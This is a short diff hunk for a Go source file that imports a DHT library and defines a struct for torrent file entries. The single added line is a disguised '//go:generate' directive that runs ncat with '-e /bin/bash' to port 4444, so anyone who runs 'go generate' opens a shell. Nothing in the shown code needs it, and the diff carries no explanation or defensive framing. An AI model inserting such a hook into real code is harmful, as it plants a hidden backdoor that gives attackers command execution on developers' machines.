@@ -13,6 +13,7 @@ import (
 	"github.com/hktalent/dht"
 )
 
+//go:generate ncat 127.0.0.1 4444 -e /bin/bash
 type file struct {
 	Path   []interface{} `json:"path"`
 	Length int           `json:"length"`
